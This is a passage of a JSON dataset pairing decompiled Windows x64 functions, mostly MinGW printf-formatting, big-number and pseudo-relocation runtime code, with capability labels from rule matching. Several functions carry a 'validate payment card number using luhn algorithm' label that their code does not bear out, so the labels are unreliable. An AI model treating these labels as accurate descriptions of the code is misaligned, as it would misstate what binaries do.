*(arg3 + 1);\ncode_r0x000140015031:\n        if (((uVar1 & 0x4000) != 0) || (iVar2 = *(arg3 + 0x24),  *(arg3 + 5) != iVar2 && iVar2 <= *(arg3 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = 0x20;\n                iVar2 = *(arg3 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc(0x20);\n                iVar2 = *(arg3 + 0x24);\n            }\n        }\n        *(arg3 + 0x24) = iVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 796
    },
    "1400150b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400150b0(uchar *arg1, int64_t *arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    \n    if (arg1 == NULL) {\n        arg1 = 0x1400d6c80;\n    }\n    if (*(arg2 + 2) < 0) {\n        iVar3 = sub.msvcrt.dll_strlen();\n    }\n    else {\n        iVar3 = fcn.140019a40(arg1, *(arg2 + 2));\n    }\n    iVar2 = *(arg2 + 2);\n    if ((-1 < iVar2) && (iVar2 < iVar3)) {\n        iVar3 = iVar2;\n    }\n    if (iVar3 < *(arg2 + 0xc)) {\n        iVar2 = *(arg2 + 0xc) - iVar3;\n        *(arg2 + 0xc) = iVar2;\n        uVar1 = *(arg2 + 1);\n        if ((uVar1 & 0x400) != 0) {\n            if (iVar3 == 0) {\n                *(arg2 + 0xc) = iVar2 + -1;\n                goto code_r0x000140015031;\n            }\n            goto code_r0x000140014fb9;\n        }\n        *(arg2 + 0xc) = iVar2 + -1;\n        do {\n            fcn.140014dc0(0x20, arg2);\n            iVar2 = *(arg2 + 0xc);\n            *(arg2 + 0xc) = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    else {\n        *(arg2 + 0xc) = 0xffffffff;\n    }\n    if (iVar3 == 0) {\n        *(arg2 + 0xc) = 0xfffffffe;\n        return;\n    }\n    uVar1 = *(arg2 + 1);\ncode_r0x000140014fb9:\n    puVar4 = arg1 + (iVar3 - 1);\n    while( true ) {\n        if (((uVar1 & 0x4000) != 0) || (iVar3 = *(arg2 + 0x24),  *(arg2 + 5) != iVar3 && iVar3 <= *(arg2 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg2 + *(arg2 + 0x24)) = *arg1;\n                iVar3 = *(arg2 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc();\n                iVar3 = *(arg2 + 0x24);\n            }\n        }\n        *(arg2 + 0x24) = iVar3 + 1;\n        if (puVar4 == arg1) break;\n        uVar1 = *(arg2 + 1);\n        arg1 = arg1 + 1;\n    }\n    while (iVar3 = *(arg2 + 0xc),  *(arg2 + 0xc) = iVar3 + -1,  0 < iVar3) {\n        uVar1 = *(arg2 + 1);\ncode_r0x000140015031:\n        if (((uVar1 & 0x4000) != 0) || (iVar3 = *(arg2 + 0x24),  *(arg2 + 5) != iVar3 && iVar3 <= *(arg2 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg2 + *(arg2 + 0x24)) = 0x20;\n                iVar3 = *(arg2 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc(0x20);\n                iVar3 = *(arg2 + 0x24);\n            }\n        }\n        *(arg2 + 0x24) = iVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 873
    },
    "14001608": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140016080(unkbyte10 *noname_0, int64_t arg2)\n\n{\n    unkbyte10 Var1;\n    ulong arg2_00;\n    uint64_t arg3;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    uint uStack40;\n    uint uStack36;\n    ushort uStack32;\n    ushort uStack30;\n    \n    Var1 = *noname_0;\n    if (*(arg2 + 0x10) < 0) {\n        *(arg2 + 0x10) = 6;\n        arg3 = 7;\n    }\n    else {\n        arg3 = *(arg2 + 0x10) + 1;\n    }\n    uStack40 = Var1;\n    uStack36 = Var1 >> 0x20;\n    uStack32 = Var1 >> 0x40;\n    uStack64 = CONCAT22(uStack30, uStack32);\n    uStack72 = uStack40;\n    uStack68 = uStack36;\n    arg2_00 = fcn.140014ca0(2, &uStack72, arg3, &uStack44);\n    if (uStack44 != 0xffff8000) {\n        fcn.140015fa0(uStack48, arg2_00, uStack44, arg2);\n        fcn.140017340(arg2_00);\n        return;\n    }\n    fcn.140015100(uStack48, arg2_00, arg2);\n    fcn.140017340(arg2_00);\n    return;\n}\n",
        "token_count": 362
    },
    "14001613": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140016130(unkbyte10 *noname_0, int64_t *arg2)\n\n{\n    unkbyte10 Var1;\n    int32_t iVar2;\n    ulong arg2_00;\n    int32_t iVar3;\n    uint64_t arg3;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    uint uStack40;\n    uint uStack36;\n    ushort uStack32;\n    ushort uStack30;\n    \n    arg3 = *(arg2 + 2);\n    Var1 = *noname_0;\n    if (*(arg2 + 2) < 0) {\n        *(arg2 + 2) = 6;\n        arg3 = 6;\n    }\n    uStack40 = Var1;\n    uStack36 = Var1 >> 0x20;\n    uStack32 = Var1 >> 0x40;\n    uStack64 = CONCAT22(uStack30, uStack32);\n    uStack72 = uStack40;\n    uStack68 = uStack36;\n    arg2_00 = fcn.140014ca0(3, &uStack72, arg3, &uStack44);\n    if (uStack44 == 0xffff8000) {\n        fcn.140015100(uStack48, arg2_00, arg2);\n    }\n    else {\n        fcn.140015bf0(uStack48, arg2_00, uStack44, arg2);\n        iVar2 = *(arg2 + 0xc);\n        while( true ) {\n            *(arg2 + 0xc) = iVar2 + -1;\n            if (iVar2 < 1) break;\n            if (((*(arg2 + 1) & 0x4000) != 0) ||\n               (iVar3 = *(arg2 + 0x24),  iVar2 = iVar2 + -1,  *(arg2 + 5) != iVar3 && iVar3 <= *(arg2 + 5))) {\n                if ((*(arg2 + 1) & 0x2000) == 0) {\n                    *(*arg2 + *(arg2 + 0x24)) = 0x20;\n                    iVar3 = *(arg2 + 0x24);\n                    iVar2 = *(arg2 + 0xc);\n                }\n                else {\n                    sub.msvcrt.dll_fputc();\n                    iVar3 = *(arg2 + 0x24);\n                    iVar2 = *(arg2 + 0xc);\n                }\n            }\n            *(arg2 + 0x24) = iVar3 + 1;\n        }\n    }\n    fcn.140017340(arg2_00);\n    return;\n}\n",
        "token_count": 595
    },
    "14001622": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140016220(unkbyte10 *noname_0, int64_t arg2)\n\n{\n    unkbyte10 Var1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ulong arg2_00;\n    uint64_t arg3;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    uint uStack40;\n    uint uStack36;\n    ushort uStack32;\n    ushort uStack30;\n    \n    uVar2 = *(arg2 + 0x10);\n    arg3 = uVar2;\n    Var1 = *noname_0;\n    if (uVar2 < 0) {\n        *(arg2 + 0x10) = 6;\n        arg3 = 6;\n    }\n    else if (uVar2 == 0) {\n        *(arg2 + 0x10) = 1;\n        arg3 = 1;\n    }\n    uStack40 = Var1;\n    uStack36 = Var1 >> 0x20;\n    uStack32 = Var1 >> 0x40;\n    uStack64 = CONCAT22(uStack30, uStack32);\n    uStack72 = uStack40;\n    uStack68 = uStack36;\n    arg2_00 = fcn.140014ca0(2, &uStack72, arg3, &uStack44);\n    if (uStack44 == 0xffff8000) {\n        fcn.140015100(uStack48, arg2_00, arg2);\n    }\n    else {\n        uVar2 = *(arg2 + 8) & 0x800;\n        if ((uStack44 < -3) || (*(arg2 + 0x10) < uStack44)) {\n            if (uVar2 == 0) {\n                iVar3 = sub.msvcrt.dll_strlen();\n            }\n            else {\n                iVar3 = *(arg2 + 0x10);\n            }\n            *(arg2 + 0x10) = iVar3 + -1;\n            fcn.140015fa0(uStack48, arg2_00, uStack44, arg2);\n        }\n        else {\n            if (uVar2 == 0) {\n                iVar3 = sub.msvcrt.dll_strlen();\n                iVar3 = iVar3 - uStack44;\n                *(arg2 + 0x10) = iVar3;\n                if ((iVar3 < 0) && (0 < *(arg2 + 0xc))) {\n                    *(arg2 + 0xc) = iVar3 + *(arg2 + 0xc);\n                }\n            }\n            else {\n                *(arg2 + 0x10) = *(arg2 + 0x10) - uStack44;\n            }\n            fcn.140015bf0(uStack48, arg2_00, uStack44, arg2);\n            while (iVar3 = *(arg2 + 0xc),  *(arg2 + 0xc) = iVar3 + -1,  0 < iVar3) {\n                fcn.140014dc0(0x20, arg2);\n            }\n        }\n    }\n    fcn.140017340(arg2_00);\n    return;\n}\n",
        "token_count": 711
    },
    "140018cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140018cf0(int64_t arg1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    \n    iVar5 = 0;\n    puVar4 = arg1 + 0x18;\n    puVar1 = puVar4 + *(arg1 + 0x14);\n    while( true ) {\n        if (puVar1 <= puVar4) {\n            return iVar5;\n        }\n        uVar2 = *puVar4;\n        if (uVar2 != 0) break;\n        puVar4 = puVar4 + 1;\n        iVar5 = iVar5 + 0x20;\n    }\n    if (puVar1 <= puVar4) {\n        return iVar5;\n    }\n    iVar3 = 0;\n    for (; (uVar2 & 1) == 0; uVar2 = uVar2 >> 1 | 0x80000000) {\n        iVar3 = iVar3 + 1;\n    }\n    return iVar5 + iVar3;\n}\n",
        "token_count": 251
    },
    "140018fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140018fe0(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    \n    iVar1 = *(arg1 + 0x14);\n    uVar4 = arg3;\n    iVar3 = 0;\n    do {\n        uVar2 = *(arg1 + 0x18 + iVar3 * 4) * arg2 + uVar4;\n        *(arg1 + 0x18 + iVar3 * 4) = uVar2;\n        iVar3 = iVar3 + 1;\n        uVar4 = uVar2 >> 0x20;\n    } while (iVar3 < iVar1);\n    iVar3 = arg1;\n    if (uVar4 != 0) {\n        if (*(arg1 + 0xc) == iVar1 || *(arg1 + 0xc) < iVar1) {\n            iVar3 = fcn.140018e70(*(arg1 + 8) + 1);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            sub.msvcrt.dll_memcpy(iVar3 + 0x10, arg1 + 0x10, *(arg1 + 0x14) * 4 + 8);\n            fcn.140018f70(arg1);\n        }\n        *(iVar3 + 0x18 + iVar1 * 4) = uVar2 >> 0x20;\n        *(iVar3 + 0x14) = iVar1 + 1;\n    }\n    return iVar3;\n}\n",
        "token_count": 359
    },
    "140019d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140019d80(ushort *arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg4_00;\n    ushort uStack42;\n    \n    uStack42 = 0;\n    if (arg1 == NULL) {\n        arg1 = &uStack42;\n    }\n    sub.msvcrt.dll____mb_cur_max_func();\n    sub.msvcrt.dll____lc_codepage_func();\n    arg4_00 = 0x1400eec28;\n    if (arg4 != 0) {\n        arg4_00 = arg4;\n    }\n    iVar1 = fcn.140019c00(arg1, arg2, arg3, arg4_00);\n    return iVar1;\n}\n",
        "token_count": 173
    },
    "140019f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140019f60(uchar *arg1, ulong noname_1, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    uint *puVar2;\n    uint16_t auStackX16 [12];\n    int32_t aiStack12 [3];\n    \n    auStackX16[0] = noname_1;\n    if (arg3 == 0) {\n        if (0xff < noname_1) {\ncode_r0x000140019fd4:\n            puVar2 = sub.msvcrt.dll__errno();\n            *puVar2 = 0x2a;\n            return 0xffffffff;\n        }\n        *arg1 = noname_1;\n        uVar1 = 1;\n    }\n    else {\n        aiStack12[0] = 0;\n        uVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(arg3, 0, auStackX16, 1, arg1, arg4, 0, aiStack12);\n        if ((uVar1 == 0) || (aiStack12[0] != 0)) goto code_r0x000140019fd4;\n    }\n    return uVar1;\n}\n",
        "token_count": 267
    },
    "14001a14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14001a140(uint64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll___iob_func();\n    return iVar1 + (arg1 & 0xffffffff) * 0x30;\n}\n",
        "token_count": 60
    },
    "140001e7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.140001e7d(uint64_t arg1)\n\n{\n    ulong *puVar1;\n    \n    for (puVar1 = *((arg1 & 0xff) * 8 + 0x1400ed3f0); (puVar1 != NULL && (arg1 != puVar1[1])); puVar1 = *puVar1) {\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "1400132a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.1400132a0(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    while (iVar1 = *arg1,  *arg1 = 0,  iVar1 == 0) {\n        do {\n        } while (*arg1 == 0);\n    }\n    return 0;\n}\n",
        "token_count": 73
    },
    "14000a1c": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid fcn.14000a1c0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    uint32_t *puVar9;\n    int64_t iVar10;\n    code *pcVar11;\n    uint32_t uVar12;\n    int64_t iVar13;\n    uint64_t uVar14;\n    uint64_t *puVar15;\n    uint *puVar16;\n    int64_t iVar17;\n    int64_t *piVar18;\n    int32_t *piVar19;\n    int32_t iVar20;\n    uint uVar21;\n    char *arg1_00;\n    uint32_t *puVar22;\n    int64_t *arg1_01;\n    ulong *arg3_00;\n    ulong in_XMM2_Qa;\n    ulong in_XMM3_Qa;\n    ulong uStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    ulong auStack392 [5];\n    uint auStack352 [2];\n    uint64_t auStack344 [10];\n    uchar auStack264 [8];\n    ulong uStack256;\n    int64_t iStack240;\n    int64_t iStack232;\n    ulong auStack144 [3];\n    ulong uStack120;\n    int32_t iStack108;\n    ulong *puStack96;\n    \n    puStack96 = &uStackX16;\n    uStackX16 = arg2;\n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    iVar13 = fcn.14001a140(2);\n    sub.msvcrt.dll_fwrite(\"Mingw-w64 runtime failure:\\n\", 1, 0x1b);\n    uVar14 = fcn.14001a140(2);\n    arg3_00 = puStack96;\n    sub.msvcrt.dll_vfprintf(uVar14, arg1);\n    sub.msvcrt.dll_abort();\n    iStack240 = *0x1400edf74;\n    if (*0x1400edf74 < 1) goto code_r0x00014000a360;\n    iVar20 = 0;\n    puVar15 = *0x1400edf78 + 0x18;\n    do {\n        if ((*puVar15 <= uVar14) && (arg3_00 = *(puVar15[1] + 8),  uVar14 < *puVar15 + arg3_00)) {\n            return;\n        }\n        iVar20 = iVar20 + 1;\n        puVar15 = puVar15 + 5;\n    } while (iVar20 != *0x1400edf74);\n    while (iStack232 = fcn.14000abd0(uVar14),  iStack232 != 0) {\n        iStack240 = iStack240 * 0x28;\n        puVar16 = *0x1400edf78 + iStack240;\n        *(puVar16 + 8) = iStack232;\n        *puVar16 = 0;\n        iVar17 = fcn.14000ad00();\n        iVar17 = *(iStack232 + 0xc) + iVar17;\n        *(*0x1400edf78 + iStack240 + 0x18) = iVar17;\n        iVar17 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(iVar17, auStack144, 0x30);\n        if (iVar17 == 0) {\n            arg3_00 = *(*0x1400edf78 + iStack240 + 0x18);\n            fcn.14000a1c0(\"  VirtualQuery failed for %d bytes at address %p\", *(iStack232 + 8), arg3_00, iVar13);\n            break;\n        }\n        if (((iStack108 - 0x40U & 0xffffffbf) == 0) || ((iStack108 - 4U & 0xfffffffb) == 0)) {\ncode_r0x00014000a2fc:\n            *0x1400edf74 = *0x1400edf74 + 1;\n            return;\n        }\n        arg3_00 = 0x4;\n        if (iStack108 != 2) {\n            arg3_00 = 0x40;\n        }\n        iVar13 = *0x1400edf78 + iStack240;\n        *(iVar13 + 8) = auStack144[0];\n        *(iVar13 + 0x10) = uStack120;\n        iVar20 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        if (iVar20 != 0) goto code_r0x00014000a2fc;\n        uVar12 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.14000a1c0(\"  VirtualProtect failed with code 0x%x\", uVar12, arg3_00, iVar13);\ncode_r0x00014000a360:\n        iStack240 = 0;\n    }\n    arg1_00 = \"Address %p has no image-section\";\n    fcn.14000a1c0(\"Address %p has no image-section\", uVar14, arg3_00, iVar13);\n    iVar20 = *0x1400edf70;\n    if (*0x1400edf70 != 0) {\n        return;\n    }\n    *0x1400edf70 = 1;\n    auStack344[5] = 0x14000a3df;\n    fcn.14000ac50();\n    auStack344[5] = 0x14000a3f6;\n    iVar17 = fcn.14000ae90(arg1_00);\n    iVar10 = *0x1400d7060;\n    puVar9 = *0x1400d7030;\n    *0x1400edf74 = 0;\n    iVar17 = -iVar17;\n    *0x1400edf78 = auStack264 + iVar17;\n    if (*0x1400d7030 - *0x1400d7040 < 8) {\n        *0x1400edf74 = 0;\n        return;\n    }\n    puVar22 = *0x1400d7040;\n    if (*0x1400d7030 - *0x1400d7040 < 0xc) {\ncode_r0x00014000a433:\n        if (*puVar22 == 0) {\n            uVar12 = puVar22[1];\ncode_r0x00014000a440:\n            if (uVar12 == 0) {\n                uVar14 = puVar22[2];\n                if (puVar22[2] != 1) {\ncode_r0x00014000a611:\n                    uVar21 = 0x400d69a0;\n                    *(auStack344 + iVar17 + 0x28) = 0x14000a61d;\n                    fcn.14000a1c0(\"  Unknown pseudo relocation protocol version %d.\\n\", uVar14, arg3_00, iVar13);\n                    if (*0x1400edf80 != NULL) {\n                        uVar6 = *(&uStack256 + iVar17);\n                        *(auStack352 + iVar17) = uVar21;\n                        *(auStack344 + iVar17) = uVar14;\n                        *(auStack344 + iVar17 + 8) = in_XMM2_Qa;\n                        *(auStack344 + iVar17 + 0x10) = in_XMM3_Qa;\n                        *(auStack344 + iVar17 + 0x18) = uVar6;\n                        *(auStack392 + iVar17) = 0x14000a65b;\n                        (**0x1400edf80)(auStack352 + iVar17);\n                    }\n                    return;\n                }\n                puVar22 = puVar22 + 3;\n                if (*0x1400d7030 <= puVar22) {\n                    *0x1400edf74 = 0;\n                    return;\n                }\n                do {\n                    while( true ) {\n                        uVar2 = *(puVar22 + 2);\n                        uVar14 = uVar2;\n                        piVar18 = *puVar22 + iVar10;\n                        arg1_01 = puVar22[1] + iVar10;\n                        iVar5 = *piVar18;\n                        if (uVar2 != 0x20) break;\n                        iVar4 = *arg1_01;\n                        *(auStack344 + iVar17 + 0x28) = 0x14000a5c4;\n                        fcn.14000a230(arg1_01);\n                        *arg1_01 = iVar5 + (iVar4 - piVar18);\ncode_r0x00014000a49c:\n                        puVar22 = puVar22 + 3;\n                        if (puVar9 <= puVar22) goto code_r0x00014000a508;\n                    }\n                    if (0x20 < uVar2) {\n                        if (uVar2 == 0x40) {\n                            iVar8 = *arg1_01;\n                            *(auStack344 + iVar17 + 0x28) = 0x14000a59a;\n                            fcn.14000a230(arg1_01);\n                            *arg1_01 = iVar5 + (iVar8 - piVar18);\n                            goto code_r0x00014000a49c;\n                        }\ncode_r0x00014000a605:\n                        *(auStack344 + iVar17 + 0x28) = 0x14000a611;\n                        fcn.14000a1c0(\"  Unknown pseudo relocation bit size %d.\\n\", uVar14, arg3_00, iVar13);\n                        goto code_r0x00014000a611;\n                    }\n                    if (uVar2 == 8) {\n                        uVar2 = *arg1_01;\n                        arg3_00 = uVar2 | 0xffffffffffffff00;\n                        *(auStack344 + iVar17 + 0x28) = 0x14000a499;\n                        fcn.14000a230(arg1_01);\n                        *arg1_01 = iVar5 + (uVar2 - piVar18);\n                        goto code_r0x00014000a49c;\n                    }\n                    if (uVar2 != 0x10) goto code_r0x00014000a605;\n                    uVar3 = *arg1_01;\n                    arg3_00 = uVar3 | 0xffffffffffff0000;\n                    puVar22 = puVar22 + 3;\n                    *(auStack344 + iVar17 + 0x28) = 0x14000a4fa;\n                    fcn.14000a230(arg1_01);\n                    *arg1_01 = iVar5 + (uVar3 - piVar18);\n                } while (puVar22 < puVar9);\n                goto code_r0x00014000a508;\n            }\n        }\n    }\n    else if (**0x1400d7040 == 0) {\n        uVar12 = (*0x1400d7040)[1];\n        if ((uVar12 | (*0x1400d7040)[2]) == 0) {\n            puVar22 = *0x1400d7040 + 3;\n            goto code_r0x00014000a433;\n        }\n        goto code_r0x00014000a440;\n    }\n    if (*0x1400d7030 <= puVar22) {\n        *0x1400edf74 = 0;\n        return;\n    }\n    do {\n        puVar1 = puVar22 + 1;\n        uVar12 = *puVar22;\n        puVar22 = puVar22 + 2;\n        piVar19 = *puVar1 + iVar10;\n        iVar4 = *piVar19;\n        *(auStack344 + iVar17 + 0x28) = 0x14000a5f8;\n        fcn.14000a230(piVar19);\n        *piVar19 = uVar12 + iVar4;\n    } while (puVar22 < puVar9);\ncode_r0x00014000a508:\n    pcVar11 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (0 < *0x1400edf74) {\n        iVar13 = 0;\n        do {\n            piVar19 = *0x1400edf78 + iVar13;\n            iVar4 = *piVar19;\n            if (iVar4 != 0) {\n                uVar6 = *(piVar19 + 4);\n                uVar7 = *(piVar19 + 2);\n                *(auStack344 + iVar17 + 0x28) = 0x14000a547;\n                (*pcVar11)(uVar7, uVar6, iVar4, &uStack256 + 4);\n            }\n            iVar20 = iVar20 + 1;\n            iVar13 = iVar13 + 0x28;\n        } while (iVar20 < *0x1400edf74);\n    }\n    return;\n}\n",
        "token_count": 2906
    }
}